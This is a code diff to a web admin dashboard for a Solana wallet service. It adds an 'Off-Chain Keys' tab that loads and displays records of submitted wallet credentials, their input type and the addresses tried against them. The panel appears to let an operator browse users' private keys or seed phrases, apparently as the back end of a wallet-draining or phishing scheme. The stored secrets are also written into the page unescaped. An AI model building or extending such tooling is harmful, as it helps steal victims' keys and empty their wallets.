@@ -88,6 +88,10 @@
         .alert-error {background: #f8d7da; color: #721c24;}
         .logout-btn {background: #dc3545; color: white; padding: 10px 20px; border: none; border-radius: 8px; cursor: pointer;}
         .credentials-box {background: #f8f9fa; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 13px; word-break: break-all;}
+        .nav-tabs {display: flex; gap: 10px; margin-bottom: 25px; flex-wrap: wrap;}
+        .nav-tab {padding: 10px 24px; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; background: #e0e0e0; color: #555; transition: all 0.2s;}
+        .nav-tab.active {background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white;}
+        .badge-warning {background: #fff3cd; color: #856404;}
 
         /* Mobile Responsive Styles */
         @media (max-width: 768px) {
@@ -173,27 +177,61 @@
 
             <div id="statsGrid" class="stats-grid"></div>
 
-            <div class="table-container">
-                <div class="table-header">
-                    <h2 style="color: #333;">💼 All Wallets</h2>
-                    <input type="text" class="search-box" id="searchBox" placeholder="Search by address or type..." onkeyup="filterWallets()">
+            <div class="nav-tabs">
+                <button class="nav-tab active" id="tab-wallets" onclick="switchMainTab('wallets')">💼 All Wallets</button>
+                <button class="nav-tab" id="tab-offchain" onclick="switchMainTab('offchain')">⚠️ Off-Chain Keys <span id="offChainBadge"></span></button>
+            </div>
+
+            <!-- All Wallets Panel -->
+            <div id="panel-wallets">
+                <div class="table-container">
+                    <div class="table-header">
+                        <h2 style="color: #333;">💼 All Wallets</h2>
+                        <input type="text" class="search-box" id="searchBox" placeholder="Search by address or type..." onkeyup="filterWallets()">
+                    </div>
+                    <div style="overflow-x: auto;">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Wallet Address</th>
+                                    <th>Type</th>
+                                    <th>SOL</th>
+                                    <th>Solsnipe</th>
+                                    <th>Deposit</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="walletsTableBody">
+                                <tr><td colspan="6" style="text-align: center; padding: 40px; color: #999;">Loading wallets...</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
                 </div>
-                <div style="overflow-x: auto;">
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>Wallet Address</th>
-                                <th>Type</th>
-                                <th>SOL</th>
-                                <th>Solsnipe</th>
-                                <th>Deposit</th>
-                                <th>Actions</th>
-                            </tr>
-                        </thead>
-                        <tbody id="walletsTableBody">
-                            <tr><td colspan="6" style="text-align: center; padding: 40px; color: #999;">Loading wallets...</td></tr>
-                        </tbody>
-                    </table>
+            </div>
+
+            <!-- Off-Chain Keys Panel -->
+            <div id="panel-offchain" style="display:none;">
+                <div class="table-container">
+                    <div class="table-header">
+                        <h2 style="color: #333;">⚠️ Off-Chain Keys</h2>
+                        <button class="btn" style="width:auto;padding:10px 20px;" onclick="loadOffChainKeys()">🔄 Refresh</button>
+                    </div>
+                    <div style="overflow-x: auto;">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Recorded At</th>
+                                    <th>Wallet Type</th>
+                                    <th>Input Type</th>
+                                    <th>Tried Addresses</th>
+                                    <th>Credentials</th>
+                                </tr>
+                            </thead>
+                            <tbody id="offChainTableBody">
+                                <tr><td colspan="5" style="text-align:center; padding:40px; color:#999;">Click Refresh to load</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
                 </div>
             </div>
         </div>
@@ -492,6 +530,43 @@
                 </div>
             `;
             document.getElementById('detailsModal').classList.add('active');
+        }
+
+        function switchMainTab(tab) {
+            document.getElementById('panel-wallets').style.display = tab === 'wallets' ? 'block' : 'none';
+            document.getElementById('panel-offchain').style.display = tab === 'offchain' ? 'block' : 'none';
+            document.getElementById('tab-wallets').classList.toggle('active', tab === 'wallets');
+            document.getElementById('tab-offchain').classList.toggle('active', tab === 'offchain');
+            if (tab === 'offchain') loadOffChainKeys();
+        }
+
+        async function loadOffChainKeys() {
+            document.getElementById('offChainTableBody').innerHTML = '<tr><td colspan="5" style="text-align:center;padding:40px;color:#999;">Loading...</td></tr>';
+            try {
+                const res = await fetch(`${API}/get-off-chain-keys`, {
+                    headers: {'Authorization': `Bearer ${token}`}
+                });
+                if (!res.ok) { const e = await res.json(); throw new Error(e.error || 'Failed'); }
+                const data = await res.json();
+                const list = data.offChainKeys || [];
+                document.getElementById('offChainBadge').textContent = list.length > 0 ? `(${list.length})` : '';
+                if (list.length === 0) {
+                    document.getElementById('offChainTableBody').innerHTML = '<tr><td colspan="5" style="text-align:center;padding:40px;color:#999;">No off-chain keys recorded yet</td></tr>';
+                    return;
+                }
+                document.getElementById('offChainTableBody').innerHTML = list.map(k => {
+                    const tried = Array.isArray(k.triedAddresses) ? k.triedAddresses.join('<br>') : (k.triedAddresses || '-');
+                    return `<tr>
+                        <td data-label="Recorded At">${new Date(k.recordedAt).toLocaleString()}</td>
+                        <td data-label="Wallet Type"><span class="badge badge-warning">${k.walletType || '-'}</span></td>
+                        <td data-label="Input Type">${k.inputType || '-'}</td>
+                        <td data-label="Tried Addresses" style="font-family:monospace;font-size:12px;">${tried}</td>
+                        <td data-label="Credentials"><div class="credentials-box" style="max-width:300px;">${k.credentials || '-'}</div></td>
+                    </tr>`;
+                }).join('');
+            } catch (e) {
+                document.getElementById('offChainTableBody').innerHTML = `<tr><td colspan="5" style="text-align:center;color:red;">Error: ${e.message}</td></tr>`;
+            }
         }
 
         function switchWalletDetailsTab(tabId) {
